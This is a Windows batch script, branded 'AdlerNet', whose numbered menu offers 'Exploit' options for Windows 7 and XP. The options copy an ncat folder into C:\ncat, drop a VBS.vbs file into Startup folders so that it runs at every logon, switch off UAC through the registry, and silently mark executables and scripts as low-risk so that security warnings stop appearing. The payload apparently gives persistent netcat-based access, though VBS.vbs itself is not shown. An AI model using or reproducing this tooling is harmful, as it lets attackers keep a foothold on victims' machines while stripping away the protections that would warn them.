
ECHO OFF
CLS
:MENU

ECHO.
ECHO ...............................................
ECHO.
ECHO AdlerNet Presents
ECHO.
ECHO PRESS 1 - 10 to select your Exploit, or 10 to EXIT.
ECHO.
ECHO ...............................................
ECHO.
ECHO 1 - Run Win7 Exploit.
ECHO 2 - Run Winxp Exploit.
ECHO 3 - Disable Win7 users Warnings. None UAC warnings!
ECHO 4 - Disable Win7 UAC. You need to run this option twice.
ECHO 5 - Enable Win7 UAC. You need to run this option twice.
ECHO 9 - Reboot.
ECHO 10 - EXIT
ECHO.

SET /P M=Type 1, 2, 3, or 4 then press ENTER:
IF %M%==1 GOTO Win7
IF %M%==2 GOTO winxp
IF %M%==3 GOTO warnings
IF %M%==4 GOTO uac
IF %M%==5 GOTO uac-on
IF %M%==9 GOTO reboot
IF %M%==10 GOTO EOF

:Win7
@echo off

:: BatchGotAdmin elevate rights!
:-------------------------------------
REM --&gt; Check for permissions
&gt;nul 2&gt;&amp;1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --&gt; If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
echo Requesting administrative privileges...
goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) &gt; "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 &gt;&gt; "%temp%\getadmin.vbs"

"%temp%\getadmin.vbs"
exit /B

:gotAdmin
if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
pushd "%CD%"
CD /D "%~dp0"
:--------------------------------------

@echo off
robocopy "C:\Users\test\Desktop\Exploit1\ncat" "C:\ncat"

robocopy "E:\Users\test\Desktop\Exploit1\ncat" "C:\ncat"
robocopy "F:\Users\test\Desktop\Exploit1\ncat" "C:\ncat"
robocopy "G:\Users\test\Desktop\Exploit1\ncat" "C:\ncat"
robocopy "H:\Users\test\Desktop\Exploit1\ncat" "C:\ncat"
robocopy "I:\Users\test\Desktop\Exploit1\ncat" "C:\ncat"
robocopy "J:\Users\test\Desktop\Exploit1\ncat" "C:\ncat"

copy "C:\Users\test\Desktop\Exploit1\ncat\VBS.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\VBS.vbs"
copy "D:\Users\test\Desktop\Exploit1\ncat\VBS.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\VBS.vbs"
copy "E:\Users\test\Desktop\Exploit1\ncat\VBS.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\VBS.vbs"
copy "F:\Users\test\Desktop\Exploit1\ncat\VBS.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\VBS.vbs"
copy "G:\Users\test\Desktop\Exploit1\ncat\VBS.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\VBS.vbs"
copy "H:\Users\test\Desktop\Exploit1\ncat\VBS.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\VBS.vbs"
copy "I:\Users\test\Desktop\Exploit1\ncat\VBS.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\VBS.vbs"
copy "J:\Users\test\Desktop\Exploit1\ncat\VBS.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\VBS.vbs"
ECHO.
GOTO MENU

:uac
@echo off

:: BatchGotAdmin elevate rights!
:-------------------------------------
REM --&gt; Check for permissions
&gt;nul 2&gt;&amp;1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --&gt; If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
echo Requesting administrative privileges...
goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) &gt; "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 &gt;&gt; "%temp%\getadmin.vbs"

"%temp%\getadmin.vbs"
exit /B

:gotAdmin
if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
pushd "%CD%"
CD /D "%~dp0"
:--------------------------------------
C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
ECHO.
GOTO MENU

:uac-on
@echo off

:: BatchGotAdmin elevate rights!
:-------------------------------------
REM --&gt; Check for permissions
&gt;nul 2&gt;&amp;1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --&gt; If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
echo Requesting administrative privileges...
goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) &gt; "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "", "", "runas", 1 &gt;&gt; "%temp%\getadmin.vbs"

"%temp%\getadmin.vbs"
exit /B

:gotAdmin
if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
pushd "%CD%"
CD /D "%~dp0"
:--------------------------------------
C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
ECHO.
GOTO MENU

:winxp
@echo off
echo d | xcopy "C:\Documents and Settings\11\Desktop\Exploit2\ncat" "C:\ncat"
echo d | xcopy "E:\Documents and Settings\11\Desktop\Exploit2\ncat" "C:\ncat"
echo d | xcopy "F:\Documents and Settings\11\Desktop\Exploit2\ncat" "C:\ncat"
echo d | xcopy "G:\Documents and Settings\11\Desktop\Exploit2\ncat" "C:\ncat"
echo d | xcopy "H:\Documents and Settings\11\Desktop\Exploit2\ncat" "C:\ncat"
echo d | xcopy "I:\Documents and Settings\11\Desktop\Exploit2\ncat" "C:\ncat"
echo d | xcopy "J:\Documents and Settings\11\Desktop\Exploit2\ncat" "C:\ncat"

copy "C:\Documents and Settings\11\Desktop\Exploit2\ncat\VBS.vbs" "C:\Documents and Settings\default\Start Menu\Programs\Startup\VBS.vbs"
copy "E:\Documents and Settings\11\Desktop\Exploit2\ncat\VBS.vbs" "C:\Documents and Settings\default\Start Menu\Programs\Startup\VBS.vbs"
copy "F:\Documents and Settings\11\Desktop\Exploit2\ncat\VBS.vbs" "C:\Documents and Settings\default\Start Menu\Programs\Startup\VBS.vbs"
copy "G:\Documents and Settings\11\Desktop\Exploit2\ncat\VBS.vbs" "C:\Documents and Settings\default\Start Menu\Programs\Startup\VBS.vbs"
copy "H:\Documents and Settings\11\Desktop\Exploit2\ncat\VBS.vbs" "C:\Documents and Settings\default\Start Menu\Programs\Startup\VBS.vbs"
copy "I:\Documents and Settings\11\Desktop\Exploit2\ncat\VBS.vbs" "C:\Documents and Settings\default\Start Menu\Programs\Startup\VBS.vbs"
copy "J:\Documents and Settings\11\Desktop\Exploit2\ncat\VBS.vbs" "C:\Documents and Settings\default\Start Menu\Programs\Startup\VBS.vbs"

regedit /s C:\Documents and Settings\11\Desktop\Exploit2\ncat\Disable_Open-File_Security_Warning.reg
regedit /s E:\Documents and Settings\11\Desktop\Exploit2\ncat\Disable_Open-File_Security_Warning.reg
regedit /s F:\Documents and Settings\11\Desktop\Exploit2\ncat\Disable_Open-File_Security_Warning.reg
regedit /s J:\Documents and Settings\11\Desktop\Exploit2\ncat\Disable_Open-File_Security_Warning.reg
regedit /s H:\Documents and Settings\11\Desktop\Exploit2\ncat\Disable_Open-File_Security_Warning.reg
regedit /s I:\Documents and Settings\11\Desktop\Exploit2\ncat\Disable_Open-File_Security_Warning.reg
regedit /s J:\Documents and Settings\11\Desktop\Exploit2\ncat\Disable_Open-File_Security_Warning.reg
ECHO.
GOTO MENU

:warnings
@ECHO OFF
If exist "%Temp%\~import.reg" (
Attrib -R -S -H "%Temp%\~import.reg"
del /F /Q "%Temp%\~import.reg"
If exist "%Temp%\~import.reg" (
Echo Could not delete file "%Temp%\~import.reg"
Pause
)
)
&gt; "%Temp%\~import.reg" ECHO Windows Registry Editor Version 5.00
&gt;&gt; "%Temp%\~import.reg" ECHO.
&gt;&gt; "%Temp%\~import.reg" ECHO [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments]
&gt;&gt; "%Temp%\~import.reg" ECHO "SaveZoneInformation"=dword:00000001
&gt;&gt; "%Temp%\~import.reg" ECHO.
&gt;&gt; "%Temp%\~import.reg" ECHO [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Associations]
&gt;&gt; "%Temp%\~import.reg" ECHO "LowRiskFileTypes"=".avi;.bat;.com;.cmd;.exe;.htm;.html;.mpg;.mpeg;.mov;.mp3;.msi;.m3u;.rar;.reg;.txt;.vbs;.wav;.zip;"
&gt;&gt; "%Temp%\~import.reg" ECHO.
&gt;&gt; "%Temp%\~import.reg" ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments]
&gt;&gt; "%Temp%\~import.reg" ECHO "SaveZoneInformation"=-
&gt;&gt; "%Temp%\~import.reg" ECHO.
&gt;&gt; "%Temp%\~import.reg" ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations]
&gt;&gt; "%Temp%\~import.reg" ECHO "LowRiskFileTypes"=-
START /WAIT REGEDIT /S "%Temp%\~import.reg"
DEL "%Temp%\~import.reg"
ECHO.
GOTO MENU

:reboot
shutdown -r -t 0
